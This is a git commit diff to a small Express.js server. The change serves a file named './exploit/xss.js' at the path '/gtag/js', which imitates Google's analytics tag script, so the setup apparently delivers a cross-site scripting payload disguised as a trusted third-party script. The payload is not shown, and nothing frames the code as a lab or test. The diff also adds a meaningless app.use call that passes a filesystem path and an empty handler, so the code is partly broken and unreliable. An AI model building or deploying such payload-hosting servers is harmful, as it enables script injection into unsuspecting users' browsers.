e962b1e792c7c09650bd7948e41c285880439966
Aka, but nice <120267628+akabutnicer@users.noreply.github.com>
2023-12-17 16:46:46 -0500

    Update index.js

--- index.js
+++ index.js
@@ -1,12 +1,14 @@
 const express = require("express");
 const app = express();
 const port = 3000;
-app.use("./exploit/");
+const path = require("path");
+app.use(path.join(__dirname, "./exploit"), () => {
+  
+});
 /*
   */
-app.get("./gtag/js", (req, res) => {
-   if (!req.params.id) return;
-   res.sendFile("xss.js");
+app.get("/gtag/js", (req, res) => {
+   res.sendFile(path.join(__dirname, "./exploit/xss.js"));
 });
 
 app.listen(process.env.port || port, () => {
